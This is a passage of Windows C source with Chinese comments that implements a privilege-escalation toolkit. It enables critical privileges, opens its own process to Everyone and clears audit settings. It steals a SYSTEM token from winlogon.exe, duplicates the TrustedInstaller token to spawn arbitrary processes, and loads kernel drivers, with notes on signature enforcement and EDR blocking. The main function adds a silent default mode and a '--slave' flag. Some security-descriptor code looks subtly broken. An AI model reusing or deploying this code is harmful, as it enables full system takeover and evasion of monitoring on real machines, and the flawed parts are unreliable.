 *   SeSystemtimePrivilege   — 修改系统时间
 *   SeShutdownPrivilege     — 关闭系统
 *
 * @return 成功启用的特权数量
 */
static int EnableCriticalPrivileges(void) {
    /* 按重要性排序：TCB 和 Debug 是提权链的基石 */
    static LPCSTR kCriticalPrivileges[] = {
        SE_TCB_NAME,                    /* "SeTcbPrivilege" */
        SE_DEBUG_NAME,                  /* "SeDebugPrivilege" */
        SE_LOAD_DRIVER_NAME,            /* "SeLoadDriverPrivilege" */
        SE_BACKUP_NAME,                 /* "SeBackupPrivilege" */
        SE_RESTORE_NAME,                /* "SeRestorePrivilege" */
        SE_IMPERSONATE_NAME,            /* "SeImpersonatePrivilege" */
        SE_CREATE_TOKEN_NAME,           /* "SeCreateTokenPrivilege" */
        SE_TAKE_OWNERSHIP_NAME,         /* "SeTakeOwnershipPrivilege" */
        SE_SECURITY_NAME,               /* "SeSecurityPrivilege" */
        SE_INCREASE_QUOTA_NAME,         /* "SeIncreaseQuotaPrivilege" */
        SE_ASSIGNPRIMARYTOKEN_NAME,     /* "SeAssignPrimaryTokenPrivilege" */
        SE_SYSTEMTIME_NAME,             /* "SeSystemtimePrivilege" */
        SE_SHUTDOWN_NAME,               /* "SeShutdownPrivilege" */
    };

    int count = 0;
    int total = sizeof(kCriticalPrivileges) / sizeof(kCriticalPrivileges[0]);

    printf("[Priv] 正在启用关键内核特权 (%d 项)...\n", total);
    for (int i = 0; i < total; i++) {
        if (EnablePrivilege(kCriticalPrivileges[i])) {
            count++;
            printf("  [OK]   %2d. %s\n", i + 1, kCriticalPrivileges[i]);
        } else {
            printf("  [FAIL] %2d. %s (令牌中可能不含此特权)\n",
                   i + 1, kCriticalPrivileges[i]);
        }
    }
    printf("[Priv] 成功启用 %d/%d 项特权\n\n", count, total);
    return count;
}

/* ---- 安全描述符 — NULL DACL（完全绕过权限检查） ---- */

/**
 * @brief 创建具有 NULL DACL 的安全描述符
 *
 * NULL DACL = 对任何用户授予全部访问权限。
 * 参考 StarlightGUI 的设计思路：将此类 SD 设置到进程/对象上
 * 以绕过 Windows 的权限检查机制。
 *
 * SECURITY_DESCRIPTOR 在栈上分配，调用者无需释放。
 *
 * @param pSD          [out] 安全描述符指针
 * @param dwSDSize     [out] 安全描述符大小
 * @param bAllowAll    TRUE = NULL DACL（允许所有人访问）;
 *                     FALSE = 空 DACL（拒绝所有人访问）
 * @return TRUE 成功
 */
static BOOL CreateNullDaclSecurityDescriptor(
    PSECURITY_DESCRIPTOR pSD, DWORD *dwSDSize, BOOL bAllowAll)
{
    if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION)) {
        printf("  [DEBUG] CreateNullDaclSD: InitializeSecurityDescriptor 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    if (!SetSecurityDescriptorDacl(pSD, TRUE,
                                   bAllowAll ? NULL : (PACL)0,
                                   bAllowAll ? TRUE : FALSE)) {
        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorDacl 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("  [DEBUG] DACL 已设置为 %s\n",
           bAllowAll ? "NULL (完全访问)" : "空 (拒绝访问)");

    if (!SetSecurityDescriptorSacl(pSD, FALSE, NULL, FALSE)) {
        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorSacl 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("  [DEBUG] SACL 已清空（禁用审计）\n");

    if (!SetSecurityDescriptorOwner(pSD, NULL, FALSE)) {
        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorOwner 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    if (!SetSecurityDescriptorGroup(pSD, NULL, FALSE)) {
        printf("  [DEBUG] CreateNullDaclSD: SetSecurityDescriptorGroup 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    *dwSDSize = sizeof(SECURITY_DESCRIPTOR);
    printf("  [DEBUG] 安全描述符创建成功 (大小: %lu bytes)\n", *dwSDSize);
    return TRUE;
}

/**
 * @brief 通过 SDDL 字符串创建完整的安全描述符
 *
 * 使用 SDDL (Security Descriptor Definition Language) 比手动构建
 * DACL/ACE 更可靠。以下 SDDL 含义:
 *   "D:P(A;;GA;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)"
 *   D:  = DACL
 *   P   = 受保护（不从父对象继承）
 *   A   = 允许
 *   GA  = GENERIC_ALL 完全访问
 *   WD  = Everyone (S-1-1-0)
 *   SY  = Local System (S-1-5-18)
 *   BA  = Built-in Administrators (S-1-5-32-544)
 *
 * @param ppSD  [out] 安全描述符（调用者需 LocalFree）
 * @return TRUE 成功
 */
static BOOL CreateFullAccessSDDL(PSECURITY_DESCRIPTOR *ppSD) {
    LPCWSTR sddl = L"D:P(A;;GA;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)";
    BOOL result = ConvertStringSecurityDescriptorToSecurityDescriptorW(
        sddl, SDDL_REVISION_1, ppSD, NULL);
    if (result) {
        printf("  [DEBUG] SDDL 安全描述符转换成功\n"
               "         规则: Everyone=GA, SYSTEM=GA, Administrators=GA\n");
    } else {
        printf("  [DEBUG] SDDL 转换失败 (错误: %lu)\n", GetLastError());
    }
    return result;
}

/**
 * @brief 将当前进程的安全描述符替换为 NULL DACL
 *
 * 这样做后，任何用户都可以获得对该进程的完全访问权限，
 * 包括 PROCESS_VM_READ / PROCESS_VM_WRITE / PROCESS_VM_OPERATION 等敏感权限。
 *
 * 参考 StarlightGUI 中通过驱动覆盖安全描述符的思路，
 * 这里用用户态 SetSecurityInfo 实现等效效果。
 */
static void ApplyFullAccessToSelf(void) {
    printf("[SecDesc] 正在设置当前进程为完全访问 (NULL DACL)...\n");

    PSECURITY_DESCRIPTOR pSD = NULL;
    if (CreateFullAccessSDDL(&pSD)) {
        DWORD err = SetSecurityInfo(
            GetCurrentProcess(),             /* 目标：当前进程 */
            SE_KERNEL_OBJECT,                /* 对象类型：内核对象 */
            DACL_SECURITY_INFORMATION,       /* 只修改 DACL */
            NULL, NULL,                      /* Owner/Group 不改 */
            (PACL)*(PACL*)pSD,              /* 获取 SDDL 生成的 DACL */
            NULL);                           /* SACL 不改 */
        if (err == ERROR_SUCCESS) {
            printf("[SecDesc] 进程安全描述符已替换为完全访问\n");
        } else {
            printf("[SecDesc] SetSecurityInfo 失败，错误码: %lu\n", err);
        }
        LocalFree(pSD);
    } else {
        printf("[SecDesc] SDDL 转换失败，错误码: %lu\n", GetLastError());
    }
}

/* ---- TrustedInstaller 提权链 ---- */

/**
 * @brief 以 TrustedInstaller 权限启动指定进程
 *
 * ★ 这是 StarlightGUI 最核心的提权机制 ★
 *
 * 完整提权链 (6阶段):
 *   第1阶段: 获取 SE_DEBUG_NAME + SE_TCB_NAME 特权
 *   第2阶段: 打开 winlogon.exe → 获取 SYSTEM Token
 *   第3阶段: 模拟 SYSTEM 用户
 *   第4阶段: 启动 TrustedInstaller 服务
 *   第5阶段: 打开 TrustedInstaller.exe → 复制其 Token
 *   第6阶段: SessionID 修正 + CreateProcessWithTokenW 创建目标进程
 *
 * 参考 StarlightGUI Elevator.h:CreateProcessElevated()
 *
 * @param processPath   目标进程路径
 * @param fullPrivileges 是否启用 TI Token 中全部特权
 * @param extraArgs     额外命令行参数（可为 NULL）
 * @return TRUE 成功
 */
static BOOL CreateProcessAsTrustedInstaller(
    LPCWSTR processPath, BOOL fullPrivileges, LPCWSTR extraArgs)
{
    /* ★ 所有可能被 goto 跨越的变量统一定义在函数顶部 ★ */
    HANDLE   hSystemToken = NULL;
    HANDLE   hImpersonationToken = NULL;
    HANDLE   hTrustedInstallerToken = NULL;
    HANDLE   hWinlogon = NULL;
    HANDLE   hWinlogonToken = NULL;
    SC_HANDLE scManager = NULL;
    SC_HANDLE service = NULL;
    BOOL     serviceStarted = FALSE;
    DWORD    tiPid = 0;
    HANDLE   hTiProcess = NULL;
    HANDLE   hTiProcessToken = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    DWORD    currentSessionId = 0;
    WCHAR    cmdLine[MAX_PATH * 2] = { 0 };
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL     result = FALSE;

    printf("[TI] === 开始 TrustedInstaller 提权链 ===\n");

    /* ---- 第1阶段: 获取关键特权 ---- */
    printf("[TI] 第1阶段: 获取 SE_DEBUG + SE_TCB 特权...\n");
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        printf("[TI] [FAIL] 无法获取 SeDebugPrivilege\n");
        return FALSE;
    }
    if (!EnablePrivilege(SE_TCB_NAME)) {
        printf("[TI] [FAIL] 无法获取 SeTcbPrivilege\n");
        return FALSE;
    }
    printf("[TI] 第1阶段: 特权获取成功\n");

    /* ---- 第2阶段: 窃取 SYSTEM Token (通过 winlogon.exe) ---- */
    printf("[TI] 第2阶段: 获取 SYSTEM Token...\n");
    {
        DWORD winlogonPid = FindProcessId(L"winlogon.exe");
        if (winlogonPid == 0) {
            printf("[TI] [FAIL] 无法找到 winlogon.exe 进程\n");
            goto cleanup_ti;
        }
        printf("[TI]   winlogon.exe PID = %lu\n", winlogonPid);

        hWinlogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
        if (!hWinlogon) {
            printf("[TI] [FAIL] 无法打开 winlogon.exe (错误: %lu)\n",
                   GetLastError());
            goto cleanup_ti;
        }

        if (!OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY,
                              &hWinlogonToken)) {
            printf("[TI] [FAIL] 无法打开 winlogon Token (错误: %lu)\n",
                   GetLastError());
            goto cleanup_ti;
        }

        /* 复制两个 Token: Primary(用于创建进程) + Impersonation(用于模拟) */
        if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL,
                              SecurityImpersonation, TokenPrimary,
                              &hSystemToken)) {
            printf("[TI] [FAIL] 复制 SYSTEM Primary Token 失败 (错误: %lu)\n",
                   GetLastError());
            goto cleanup_ti;
        }

        if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL,
                              SecurityImpersonation, TokenImpersonation,
                              &hImpersonationToken)) {
            printf("[TI] [FAIL] 复制 SYSTEM Impersonation Token 失败"
                   " (错误: %lu)\n", GetLastError());
            goto cleanup_ti;
        }
    }
    printf("[TI] 第2阶段: SYSTEM Token 获取成功\n");

    /* ---- 第3阶段: 模拟 SYSTEM ---- */
    printf("[TI] 第3阶段: 模拟 SYSTEM 用户...\n");
    if (!ImpersonateLoggedOnUser(hImpersonationToken)) {
        printf("[TI] [FAIL] ImpersonateLoggedOnUser 失败 (错误: %lu)\n",
               GetLastError());
        goto cleanup_ti;
    }
    SetThreadToken(NULL, hImpersonationToken);
    printf("[TI] 第3阶段: SYSTEM 模拟成功\n");

    /* ---- 第4阶段: 启动 TrustedInstaller 服务 ---- */
    printf("[TI] 第4阶段: 启动 TrustedInstaller 服务...\n");
    scManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scManager) {
        printf("[TI] [FAIL] 以 SYSTEM 打开 SCM 失败 (错误: %lu)\n",
               GetLastError());
        RevertToSelf();
        goto cleanup_ti;
    }

    service = OpenServiceW(scManager, L"TrustedInstaller", SERVICE_ALL_ACCESS);
    serviceStarted = FALSE;
    if (service) {
        SERVICE_STATUS ss;
        if (QueryServiceStatus(service, &ss) &&
            ss.dwCurrentState == SERVICE_RUNNING) {
            serviceStarted = TRUE;
            printf("[TI]   TrustedInstaller 服务已在运行\n");
        } else {
            if (StartServiceW(service, 0, NULL)) {
                serviceStarted = TRUE;
                printf("[TI]   TrustedInstaller 服务启动成功\n");
                Sleep(500);
            } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                serviceStarted = TRUE;
                printf("[TI]   TrustedInstaller 服务正在运行\n");
            }
        }
    }

    /* 降级路径: 直接以 SYSTEM 身份创建 TrustedInstaller.exe */
    if (!serviceStarted) {
        printf("[TI]   尝试直接以 SYSTEM 创建 TrustedInstaller.exe...\n");
        if (CreateProcessAsUserW(
                hSystemToken,
                L"C:\\Windows\\servicing\\TrustedInstaller.exe",
                NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread); pi.hThread = NULL;
            CloseHandle(pi.hProcess); pi.hProcess = NULL;
            serviceStarted = TRUE;
            printf("[TI]   TrustedInstaller.exe 创建成功\n");
        } else {
            printf("[TI]   直接创建失败 (错误: %lu)\n", GetLastError());
        }
    }

    if (!serviceStarted) {
        printf("[TI] [FAIL] 无法启动 TrustedInstaller\n");
        RevertToSelf();
        goto cleanup_ti;
    }
    printf("[TI] 第4阶段: TrustedInstaller 就绪\n");

    /* ---- 第5阶段: 复制 TrustedInstaller Token ---- */
    printf("[TI] 第5阶段: 获取 TrustedInstaller Token...\n");
    tiPid = 0;
    for (int i = 0; i < 20; i++) {
        tiPid = FindProcessId(L"TrustedInstaller.exe");
        if (tiPid != 0) break;
        Sleep(250);
    }
    if (tiPid == 0) {
        printf("[TI] [FAIL] 找不到 TrustedInstaller.exe 进程\n");
        RevertToSelf();
        goto cleanup_ti;
    }
    printf("[TI]   TrustedInstaller.exe PID = %lu\n", tiPid);

    hTiProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, tiPid);
    if (!hTiProcess) {
        printf("[TI] [FAIL] 无法打开 TrustedInstaller.exe (错误: %lu)\n",
               GetLastError());
        RevertToSelf();
        goto cleanup_ti;
    }

    hTiProcessToken = NULL;
    if (!OpenProcessToken(hTiProcess, TOKEN_DUPLICATE, &hTiProcessToken)) {
        printf("[TI] [FAIL] 无法打开 TI 进程 Token (错误: %lu)\n",
               GetLastError());
        RevertToSelf();
        goto cleanup_ti;
    }

    if (!DuplicateTokenEx(hTiProcessToken, TOKEN_ALL_ACCESS, &sa,
                          SecurityImpersonation, TokenPrimary,
                          &hTrustedInstallerToken)) {
        printf("[TI] [FAIL] 复制 TI Token 失败 (错误: %lu)\n", GetLastError());
        RevertToSelf();
        goto cleanup_ti;
    }
    printf("[TI] 第5阶段: TrustedInstaller Token 复制成功\n");

    /* ---- 第5.5阶段: 可选 — 启用全部特权 ---- */
    if (fullPrivileges) {
        printf("[TI] 第5.5阶段: 启用 TI Token 全部特权...\n");
        if (!EnableAllPrivileges(hTrustedInstallerToken)) {
            printf("[TI] [WARN] 启用全部特权部分失败\n");
        }
    }

    /* ---- 第6阶段: SessionID 修正 + 创建进程 ---- */
    printf("[TI] 第6阶段: 修正 SessionID 并创建进程...\n");
    currentSessionId = WTSGetActiveConsoleSessionId();
    ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
    printf("[TI]   当前 SessionID = %lu\n", currentSessionId);

    if (!SetTokenInformation(hTrustedInstallerToken, TokenSessionId,
                             &currentSessionId, sizeof(currentSessionId))) {
        printf("[TI] [WARN] SessionID 设置失败 (错误: %lu)，继续尝试...\n",
               GetLastError());
    }

    /* 恢复自身身份 */
    RevertToSelf();

    /* 构造命令行 */
    wsprintfW(cmdLine, L"\"%s\"", processPath);
    if (extraArgs) {
        wcscat_s(cmdLine, sizeof(cmdLine)/sizeof(WCHAR), L" ");
        wcscat_s(cmdLine, sizeof(cmdLine)/sizeof(WCHAR), extraArgs);
    }

    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    /* 首选 CreateProcessWithTokenW（支持 LOGON_WITH_PROFILE） */
    if (CreateProcessWithTokenW(hTrustedInstallerToken, LOGON_WITH_PROFILE,
                                processPath, cmdLine, 0, NULL, NULL, &si, &pi)) {
        printf("[TI] 第6阶段: 进程创建成功 (PID=%lu)\n", pi.dwProcessId);
        CloseHandle(pi.hThread); pi.hThread = NULL;
        CloseHandle(pi.hProcess); pi.hProcess = NULL;
        result = TRUE;
    } else {
        printf("[TI] CreateProcessWithTokenW 失败 (错误: %lu)，"
               "尝试 CreateProcessAsUserW...\n", GetLastError());

        if (CreateProcessAsUserW(hTrustedInstallerToken,
                                 processPath, cmdLine,
                                 NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("[TI] 第6阶段: 进程创建成功 (PID=%lu, "
                   "via CreateProcessAsUserW)\n", pi.dwProcessId);
            CloseHandle(pi.hThread); pi.hThread = NULL;
            CloseHandle(pi.hProcess); pi.hProcess = NULL;
            result = TRUE;
        } else {
            printf("[TI] [FAIL] CreateProcessAsUserW 也失败 (错误: %lu)\n",
                   GetLastError());
            CloseHandle(pi.hThread); pi.hThread = NULL;
            CloseHandle(pi.hProcess); pi.hProcess = NULL;
        }
    }

cleanup_ti:
    if (!result) printf("[TI] === TrustedInstaller 提权链失败 ===\n");
    else printf("[TI] === TrustedInstaller 提权链成功 ===\n");

    /* 清理：按依赖逆序关闭句柄 */
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (hTrustedInstallerToken) CloseHandle(hTrustedInstallerToken);
    if (hTiProcessToken) CloseHandle(hTiProcessToken);
    if (hTiProcess) CloseHandle(hTiProcess);
    if (service) CloseServiceHandle(service);
    if (scManager) CloseServiceHandle(scManager);
    if (hImpersonationToken) {
        RevertToSelf();  /* 确保退出模拟 */
        CloseHandle(hImpersonationToken);
    }
    if (hSystemToken) CloseHandle(hSystemToken);
    if (hWinlogonToken) CloseHandle(hWinlogonToken);
    if (hWinlogon) CloseHandle(hWinlogon);
    return result;
}

/* ---- 内核驱动加载 ---- */

/**
 * @brief 加载内核驱动（SERVICE_KERNEL_DRIVER）
 *
 * ★ 这是获取 Ring 0 权限的核心操作 ★
 * 对应 StarlightGUI DriverUtils.cpp:LoadKernelDriver()
 *
 * 驱动加载后可通过 CreateFile("\\\\.\\<DriverName>") + DeviceIoControl
 * 在内核态执行任意操作。
 *
 * @param serviceName  驱动服务名（如 "MyKernelDriver"）
 * @param driverPath   驱动文件完整路径（如 "C:\\Drivers\\mydrv.sys"）
 * @return TRUE 成功
 */
static BOOL LoadKernelDriver(LPCWSTR serviceName, LPCWSTR driverPath) {
    printf("[Driver] ====== 加载内核驱动 ======\n");
    printf("[Driver]   服务名: %ls\n", serviceName);
    printf("[Driver]   驱动路径: %ls\n", driverPath);

    /* 检查驱动文件存在 */
    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[Driver] [FAIL] 驱动文件不存在: %ls\n", driverPath);
        return FALSE;
    }
    printf("[Driver]   驱动文件存在，大小检查通过\n");

    /* 先确保有 SeLoadDriverPrivilege */
    printf("[Driver]   正在启用 SeLoadDriverPrivilege...\n");
    if (EnablePrivilege(SE_LOAD_DRIVER_NAME)) {
        printf("[Driver]   SeLoadDriverPrivilege 已启用\n");
    } else {
        printf("[Driver]   [WARN] SeLoadDriverPrivilege 启用失败 (可能需要"
               "管理员权限)\n");
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[Driver] [FAIL] OpenSCManager 失败 (错误: %lu)\n",
               GetLastError());
        return FALSE;
    }
    printf("[Driver]   SCM 打开成功\n");

    /* 尝试打开已有服务 */
    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (hService) {
        printf("[Driver]   驱动服务已注册，检查状态...\n");
        SERVICE_STATUS ss;
        if (QueryServiceStatus(hService, &ss)) {
            printf("[Driver]   当前状态: %lu (1=STOPPED, 4=RUNNING)\n",
                   ss.dwCurrentState);
            if (ss.dwCurrentState == SERVICE_RUNNING) {
                printf("[Driver]   驱动已加载并运行\n");
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return TRUE;
            }
            if (ss.dwCurrentState == SERVICE_STOPPED) {
                printf("[Driver]   正在重新启动驱动...\n");
                if (StartServiceW(hService, 0, NULL)) {
                    printf("[Driver]   驱动重新启动成功\n");
                } else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                    printf("[Driver]   驱动已在运行\n");
                } else {
                    printf("[Driver] [FAIL] 启动驱动失败 (错误: %lu)\n",
                           GetLastError());
                    CloseServiceHandle(hService);
                    CloseServiceHandle(hSCM);
                    return FALSE;
                }
            }
        }
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return TRUE;
    }

    /* 新建内核驱动服务 */
    printf("[Driver]   正在注册内核驱动服务 (类型: SERVICE_KERNEL_DRIVER)...\n");
    hService = CreateServiceW(
        hSCM,
        serviceName,           /* 服务名 */
        serviceName,           /* 显示名 */
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,  /* ★ 关键: 内核驱动类型 ★ */
        SERVICE_DEMAND_START,   /* 手动启动 */
        SERVICE_ERROR_IGNORE,
        driverPath,             /* .sys 文件路径 */
        NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        DWORD err = GetLastError();
        printf("[Driver] [FAIL] 创建内核驱动服务失败 (错误: %lu)\n", err);
        if (err == ERROR_ACCESS_DENIED) {
            printf("[Driver]        原因: 权限不足，需要管理员权限\n");
        } else if (err == ERROR_SERVICE_EXISTS) {
            printf("[Driver]        原因: 服务已存在\n");
        } else if (err == 577) {
            printf("[Driver]        原因: DSE (驱动签名强制) 阻止加载\n");
            printf("[Driver]        提示: 需要禁用 DSE 或使用已签名驱动\n");
        }
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    printf("[Driver]   驱动服务注册成功，正在启动...\n");

    /* 启动驱动 */
    BOOL result = StartServiceW(hService, 0, NULL);
    DWORD err = GetLastError();
    if (result || err == ERROR_SERVICE_ALREADY_RUNNING) {
        printf("[Driver] ====== 内核驱动加载成功! ======\n");
        printf("[Driver]   驱动已在 Ring 0 运行\n");
        printf("[Driver]   后续可通过 CreateFile(\"\\\\\\\\.\\\\%ls\") + "
               "DeviceIoControl 与驱动通信\n", serviceName);
        result = TRUE;
    } else {
        printf("[Driver] [FAIL] 启动内核驱动失败 (错误: %lu)\n", err);
        printf("[Driver]   正在清理失败的服务注册...\n");
        DeleteService(hService);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return result;
}

/**
 * @brief 停止并卸载内核驱动
 *
 * @param serviceName  驱动服务名
 * @return TRUE 成功
 */
static BOOL UnloadKernelDriver(LPCWSTR serviceName) {
    printf("[Driver] ====== 卸载内核驱动: %ls ======\n", serviceName);

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("[Driver] [FAIL] OpenSCManager 失败 (错误: %lu)\n",
               GetLastError());
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName,
                                      SERVICE_STOP | DELETE);
    if (!hService) {
        printf("[Driver] [FAIL] 打开驱动服务失败 (错误: %lu)\n",
               GetLastError());
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    SERVICE_STATUS ss;
    if (QueryServiceStatus(hService, &ss)) {
        printf("[Driver]   当前状态: %lu\n", ss.dwCurrentState);
        if (ss.dwCurrentState != SERVICE_STOPPED) {
            printf("[Driver]   正在停止驱动...\n");
            if (ControlService(hService, SERVICE_CONTROL_STOP, &ss)) {
                printf("[Driver]   驱动已停止\n");
            } else {
                printf("[Driver]   [WARN] 停止驱动失败 (错误: %lu)，"
                       "尝试强制删除...\n", GetLastError());
            }
            Sleep(500);
        }
    }

    printf("[Driver]   正在删除驱动服务...\n");
    BOOL result = DeleteService(hService);
    if (result) {
        printf("[Driver] ====== 内核驱动卸载成功 ======\n");
    } else {
        printf("[Driver] [FAIL] 删除驱动服务失败 (错误: %lu)\n",
               GetLastError());
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return result;
}

/* ---- 驱动加载状态检测 ---- */

/**
 * @brief 检查内核驱动是否已成功加载并运行
 *
 * @param serviceName  驱动 SCM 服务名（如 "SiriusDrv"）
 * @param deviceName   驱动设备符号链接名（如 "Sirius"）
 * @return TRUE 驱动已加载并在运行
 */
static BOOL IsDriverLoaded(LPCWSTR serviceName, LPCWSTR deviceName) {
    BOOL scmRunning = FALSE;
    BOOL deviceAccessible = FALSE;

    /* 方法1: SCM 查询 */
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS ss;
            if (QueryServiceStatus(hService, &ss)) {
                if (ss.dwCurrentState == SERVICE_RUNNING) {
                    scmRunning = TRUE;
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    /* 方法2: 尝试打开驱动设备（双重验证） */
    WCHAR devicePath[256];
    wsprintfW(devicePath, L"\\\\.\\%s", deviceName);
    HANDLE hDevice = CreateFileW(devicePath, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice != INVALID_HANDLE_VALUE) {
        deviceAccessible = TRUE;
        CloseHandle(hDevice);
    }

    printf("[Driver] 状态检测:\n");
    printf("[Driver]   SCM 服务状态 (%ls): %s\n",
           serviceName, scmRunning ? "运行中" : "未运行或不可访问");
    printf("[Driver]   设备符号链接 (\\\\\\\\.\\\\%ls): %s\n",
           deviceName, deviceAccessible ? "可访问" : "不可访问");

    return scmRunning && deviceAccessible;
}

/**
 * @brief 打印驱动加载状态的终端友好提示
 */
static void PrintDriverLoadSummary(LPCWSTR serviceName, LPCWSTR deviceName) {
    printf("\n");
    printf("========================================\n");
    printf("  内核驱动加载状态汇总\n");
    printf("========================================\n");

    if (IsDriverLoaded(serviceName, deviceName)) {
        printf("  [✓] 驱动已成功加载并运行\n");
        printf("  设备路径: \\\\.\\%ls\n", deviceName);
        printf("  可通过 DeviceIoControl 与驱动通信\n");
    } else {
        printf("  [✗] 驱动未成功加载\n");
        printf("  可能原因:\n");
        printf("    1. 驱动文件 (.sys) 不存在或路径错误\n");
        printf("    2. DSE (驱动签名强制) 阻止加载\n");
        printf("       → 方案: 以管理员运行 + ElevateToKernelLevel() 后重试\n");
        printf("    3. 权限不足 (需要管理员 + SeLoadDriverPrivilege)\n");
        printf("    4. 驱动本身初始化失败 (检查驱动内部日志)\n");
        printf("    5. 杀软/EDR 拦截了驱动加载\n");
    }
    printf("========================================\n\n");
}

/* ---- 综合权限提升入口 ---- */

/**
 * @brief 综合权限提升入口：执行完整的特权获取流程
 *
 * 汇集 StarlightGUI 的全部权限提升技术，按优先级依次执行:
 *   1. 安全描述符覆盖 — NULL DACL 绕过访问检查
 *   2. 关键特权批量启用 — 13 项内核级特权
 *   3. 全部特权遍历启用 — 兜底启用 Token 中每项特权
 *
 * 此函数应在管理员权限下执行效果最佳。
 *
 * @return 成功启用的关键特权数量
 */
static int ElevateToKernelLevel(void) {
    /* 打印系统信息 */
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
#pragma warning(push)
#pragma warning(disable: 4996)
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
#pragma warning(pop)
    printf("========================================\n");
    printf("  内核级权限提升 — Kernel Level Elevation\n");
    printf("  参考: StarlightGUI v4.0.0\n");
    printf("========================================\n");
    printf("  系统版本: Windows %lu.%lu (Build %lu)\n",
           osvi.dwMajorVersion, osvi.dwMinorVersion,
           osvi.dwBuildNumber);
    printf("  当前 PID: %lu\n", GetCurrentProcessId());
    printf("  当前会话: %lu\n", WTSGetActiveConsoleSessionId());
    printf("----------------------------------------\n\n");

    int count = 0;

    /* 步骤1: 设置进程安全描述符为 NULL DACL（完全访问） */
    printf("[步骤 1/3] 安全描述符覆盖\n");
    ApplyFullAccessToSelf();
    printf("\n");

    /* 步骤2: 批量启用关键特权 */
    printf("[步骤 2/3] 关键内核特权批量启用\n");
    count = EnableCriticalPrivileges();

    /* 步骤3: 兜底 — 启用 Token 中全部剩余特权 */
    printf("[步骤 3/3] 全部特权遍历兜底\n");
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (EnableAllPrivileges(hToken)) {
            printf("[Priv] 全部特权遍历完成\n");
        } else {
            printf("[Priv] 全部特权遍历部分失败（部分特权可能不在 Token 中）\n");
        }
        CloseHandle(hToken);
    } else {
        printf("[Priv] [FAIL] 无法打开当前进程 Token (错误: %lu)\n",
               GetLastError());
    }

    printf("\n========================================\n");
    printf("  内核级权限提升完成\n");
    printf("  成功启用 %d 项关键特权\n", count);
    printf("========================================\n\n");
    return count;
}

int main(int argc, char *argv[]) {
    // ===== 第一步：解析命令行参数（最高优先级） =====
    BOOL bIsSlave     = FALSE;
    BOOL bIsUninstall = FALSE;
    BOOL bIsConsole   = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--slave")     == 0) bIsSlave     = TRUE;
        if (strcmp(argv[i], "--uninstall") == 0) bIsUninstall = TRUE;
        if (strcmp(argv[i], "--console")   == 0) bIsConsole   = TRUE;
    }

    // ===== 第二步：根据模式决定是否创建控制台 =====
    if (bIsConsole || bIsUninstall) {
        AllocConsoleWindow();   // 显示控制台
    } else {
        EnterSilentMode();      // 静默（默认）
    }

    // ===== 第三步：立即执行专属命令，然后退出 =====
    if (bIsSlave) {
        SlaveRun();
        return 0;
    }
    if (bIsUninstall) {
        UninstallService();
        return 0;
    }


    // ===== 第四步：只有“应用程序模式”或“服务模式”才会走到这里 =====
    // 注意：此时还没有执行提权和复制！这些操作只应在应用模式下做。

    // 先检测是否以服务方式启动（由 SCM 启动）
